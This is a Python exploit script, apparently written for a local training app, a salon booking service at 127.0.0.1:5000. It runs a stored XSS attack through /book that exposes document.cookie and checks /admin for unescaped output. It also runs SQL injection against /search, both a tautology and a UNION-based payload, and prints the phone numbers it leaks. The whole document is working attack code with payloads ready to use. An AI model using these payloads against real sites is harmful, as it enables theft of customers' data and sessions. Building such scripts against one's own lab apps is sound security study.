#!/usr/bin/env python3
import re
import sys
import requests

BASE_URL = "http://127.0.0.1:5000"
TIMEOUT = 5


def _hr(title):
    print("\n" + "=" * 70)
    print(title)
    print("=" * 70)


def exploit_stored_xss():
    _hr("[1] Stored XSS")

    payload = '<script>alert("XSS: cookie=" + document.cookie);</script>'
    img_payload = '<img src=x onerror="document.body.style.background=\'red\'">'

    r = requests.post(
        f"{BASE_URL}/book",
        data={
            "first_name": payload + img_payload,
            "last_name": "Attacker",
            "service": "Маникюр",
            "visit_time": "2025-01-01 10:00",
            "phone": "+7-000-000-00-00",
        },
        timeout=TIMEOUT,
        allow_redirects=False,
    )
    print(f"[*] POST /book -> {r.status_code}")

    r = requests.get(f"{BASE_URL}/admin", timeout=TIMEOUT)
    if "<script>" in r.text and 'alert("XSS' in r.text:
        print("[+] УСПЕХ: скрипт сохранён и возвращается без экранирования.")
        m = re.search(r"<td>(<script>.*?</script>.*?)</td>", r.text, re.S)
        if m:
            print("[*] Фрагмент ответа /admin:")
            print("    " + m.group(1)[:200].replace("\n", " "))
        print("\n    Откройте http://127.0.0.1:5000/admin в браузере.")
    else:
        print("[-] Payload не найден в ответе /admin.")


def exploit_sqli():
    _hr("[2] SQL Injection — обход фильтра")

    payload = "' OR '1'='1"
    r = requests.get(f"{BASE_URL}/search", params={"phone": payload}, timeout=TIMEOUT)
    print(f"[*] GET /search?phone={payload!r} -> {r.status_code}")

    r_empty = requests.get(
        f"{BASE_URL}/search", params={"phone": "zzz-none"}, timeout=TIMEOUT
    )

    phones = re.findall(r"\+7-\d{3}-\d{3}-\d{2}-\d{2}", r.text)
    phones_empty = re.findall(r"\+7-\d{3}-\d{3}-\d{2}-\d{2}", r_empty.text)

    print(f"[*] Телефонов с инъекцией : {len(set(phones))}")
    print(f"[*] Телефонов без инъекции: {len(set(phones_empty))}")

    if len(set(phones)) > len(set(phones_empty)) and len(set(phones)) > 0:
        print("[+] УСПЕХ: SQL-инъекция вернула записи вне фильтра.")
        for p in sorted(set(phones)):
            print(f"    {p}")
    else:
        print("[-] Инъекция не дала прироста данных.")

    _hr("[2b] SQL Injection — UNION-based")
    union_payload = "' UNION SELECT 1,'injected','data','--','--','pwned' --"
    r = requests.get(
        f"{BASE_URL}/search", params={"phone": union_payload}, timeout=TIMEOUT
    )
    if "pwned" in r.text or "injected" in r.text:
        print("[+] УСПЕХ: UNION-инъекция вывела произвольные строки.")
    else:
        print("[-] UNION-инъекция не сработала.")


def main():
    try:
        requests.get(BASE_URL + "/", timeout=TIMEOUT)
    except requests.RequestException as e:
        print(f"[!] Не удалось подключиться к {BASE_URL}: {e}")
        print("    Запустите приложение: python app.py")
        return 1

    exploit_stored_xss()
    exploit_sqli()
    print("\nГотово.")
    return 0


if __name__ == "__main__":
    sys.exit(main())